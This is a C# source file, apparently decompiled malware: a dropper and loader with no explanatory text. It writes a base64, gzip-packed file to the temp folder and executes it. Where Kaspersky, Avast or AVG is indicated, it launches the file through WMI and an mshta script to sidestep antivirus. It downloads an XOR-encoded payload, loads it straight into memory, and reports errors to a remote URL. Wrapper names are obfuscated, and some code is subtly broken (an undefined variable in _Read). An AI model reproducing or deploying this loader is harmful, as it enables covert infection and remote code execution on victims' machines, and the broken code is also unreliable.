// Program
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

[ComVisible(true)]
public class Program
{
	private class _WebClientClass : WebClient
	{
		protected override WebRequest _make_HttpWebRequest(Uri InstanceFlyweightPrivateData)
		{
			HttpWebRequest _HttpWebRequest = _GetWebRequest(this, InstanceFlyweightPrivateData) as HttpWebRequest;
			_set_DecompressionMethods(_HttpWebRequest, DecompressionMethods.GZip | DecompressionMethods.Deflate);
			return _HttpWebRequest;
		}

		public static WebRequest _GetWebRequest(object RequestStrategyPut, Uri _uri)
		{
			return ((WebClient)RequestStrategyPut).GetWebRequest(_uri);
		}

		public static void _set_DecompressionMethods(object _HttpWebRequest, DecompressionMethods _DecompressionMethods)
		{
			((HttpWebRequest)_HttpWebRequest).AutomaticDecompression = _DecompressionMethods;
		}
	}

	private static void _run_command(string _command)
	{
		ManagementScope scope = new ManagementScope("\\\\localhost\\root\\CIMV2");
		using ManagementClass _Win32_Process = new ManagementClass(scope, new ManagementPath("Win32_Process"), new ObjectGetOptions());
		ObjectGetOptions options = new ObjectGetOptions();
		ManagementPath path = new ManagementPath("Win32_ProcessStartup");
		ManagementObject _instance = _CreateInstance(new ManagementClass(scope, path, options));
		_set(_instance, "ShowWindow", 1);
		ManagementBaseObject _object = _GetMethodParameters(_Win32_Process, "Create");
		__set(_object, "CommandLine", _command);
		___set(_object, "ProcessStartupInformation", _instance);
		_InvokeMethod(_Win32_Process, "Create", _object, new InvokeMethodOptions());
	}

	private static byte[] ___decompress(byte[] _data)
	{
		using MemoryStream _data_stream = new MemoryStream(_data);
		using GZipStream _GZipStream = new GZipStream(_data_stream, CompressionMode.Decompress);
		using MemoryStream memoryStream = new MemoryStream();
		byte[] _downloaded_data = new byte[1024];
		int num;
		while ((num = _Read(_GZipStream, _downloaded_data, 0, _downloaded_data.Length)) > 0)
		{
			_Write(memoryStream, _downloaded_data, 0, num);
		}
		return _MemoryStreamToArray(memoryStream);
	}

	private static byte[] _download(string _url)
	{
		using _WebClientClass _WebClient = new _WebClientClass();
		int num = 0;
		while (true)
		{
			try
			{
				return _DownloadData(_WebClient, _url);
			}
			catch
			{
				num++;
				if (num == 3)
				{
					throw;
				}
				_Thread_Sleep(5000);
			}
		}
	}

	public void Work(string _payload_url, string _error_report_url_contains_av, string _base64_data, string _tmp_file_name)
	{
		bool _flag_av_detect_aspers = false;
		bool _flag_av_detect_avast = false;
		bool _flag_av_detect_avg = false;
		if (_error_report_url_contains_av.IndexOf("aspers", 0, StringComparison.OrdinalIgnoreCase) != -1)
		{
			_flag_av_detect_aspers = true;
		}
		else if (_error_report_url_contains_av.IndexOf("avast", 0, StringComparison.OrdinalIgnoreCase) != -1)
		{
			_flag_av_detect_avast = true;
		}
		else if (_error_report_url_contains_av.IndexOf("avg", 0, StringComparison.OrdinalIgnoreCase) != -1)
		{
			_flag_av_detect_avg = true;
		}
		try
		{
			_download(_error_report_url_contains_av);
		}
		catch
		{
		}
		if (!string.IsNullOrEmpty(_tmp_file_name))
		{
			try
			{
				string _path_to_tmp_file = Environment.ExpandEnvironmentVariables("%temp%\\" + _tmp_file_name.Replace(" ", "_"));
				File.WriteAllBytes(_path_to_tmp_file, ___decompress(Convert.FromBase64String(_base64_data)));
				if (_flag_av_detect_aspers || _flag_av_detect_avast || _flag_av_detect_avg)
				{
					_run_command("mshta.exe \"javascript:WshShell = new ActiveXObject(\"WScript.Shell\");WshShell.Run(\"\\\"" + _path_to_tmp_file.Replace("\\", "\\\\") + "\\\"\", 1, false);window.close()\"");
				}
				else
				{
					Process.Start(_path_to_tmp_file);
				}
			}
			catch (Exception ex)
			{
				try
				{
					_download(_error_report_url_contains_av + "&e=" + ex.Message);
				}
				catch
				{
				}
			}
		}
		try
		{
			byte[] _downloaded_data = _download(_payload_url);
			byte[] _decoded_data = new byte[_downloaded_data.Length - 32];
			for (int i = 0; i < _decoded_data.Length; i++)
			{
				_decoded_data[i] = (byte)(_downloaded_data[i + 32] ^ _downloaded_data[i % 32]);
			}
			Type[] exportedTypes = Assembly.Load(_decoded_data).GetExportedTypes();
			foreach (Type type in exportedTypes)
			{
				if (!type.Name.Equals(GetType().Name))
				{
					continue;
				}
				object[] args = new object[1] { _error_report_url_contains_av };
				try
				{
					Activator.CreateInstance(type, args);
				}
				catch (TargetInvocationException)
				{
					if (_error_report_url_contains_av.Contains("?data=av&av="))
					{
						throw new Exception(".");
					}
				}
				break;
			}
		}
		catch (Exception ex3)
		{
			try
			{
				_download(_error_report_url_contains_av + "&e=" + ex3.Message);
			}
			catch
			{
			}
		}
		finally
		{
			Process.GetCurrentProcess().Kill();
		}
	}

	public static ManagementObject _CreateInstance(object P_0)
	{
		return ((ManagementClass)P_0).CreateInstance();
	}

	public static void _set(object ClassObjectDynamic, string ClassNullRequest, object _value)
	{
		((ManagementBaseObject)ClassObjectDynamic)[ClassNullRequest] = _value;
	}

	public static ManagementBaseObject _GetMethodParameters(object ImplementationProxyProgram, string _DecompressionMethods)
	{
		return ((ManagementObject)ImplementationProxyProgram).GetMethodParameters(_DecompressionMethods);
	}

	public static void __set(object MediatorFlyweightTree, string EncapsulatedTreeDefer, object _value)
	{
		((ManagementBaseObject)MediatorFlyweightTree)[EncapsulatedTreeDefer] = _value;
	}

	public static void ___set(object RestoreAlgorithmObserver, string FacadeMediatorPrivate, object _value)
	{
		((ManagementBaseObject)RestoreAlgorithmObserver)[FacadeMediatorPrivate] = _value;
	}

	public static ManagementBaseObject _InvokeMethod(object AccessorPrivateComposite, string DynamicAccessorIterator, ManagementBaseObject MementoAlgorithmNotify, InvokeMethodOptions _invoke_options)
	{
		return ((ManagementObject)AccessorPrivateComposite).InvokeMethod(DynamicAccessorIterator, MementoAlgorithmNotify, _invoke_options);
	}

	public static void _Write(object _stream_obj, byte[] _src_data, int _write_start, int _write_end)
	{
		((Stream)_stream_obj).Write(_src_data, _write_start, _write_end);
	}

	public static int _Read(object _stream_obj, byte[] _src_data, int _read_start, int _end)
	{
		return ((Stream)_stream_obj).Read(_src_data, _read_start, _read_end);
	}

	public static byte[] _MemoryStreamToArray(object stream)
	{
		return ((MemoryStream)stream).ToArray();
	}

	public static byte[] _DownloadData(object _WebClient, string _url)
	{
		return ((WebClient)_WebClient).DownloadData(_url);
	}

	public static void _Thread_Sleep(int sleep_time)
	{
		Thread.Sleep(sleep_time);
	}
}
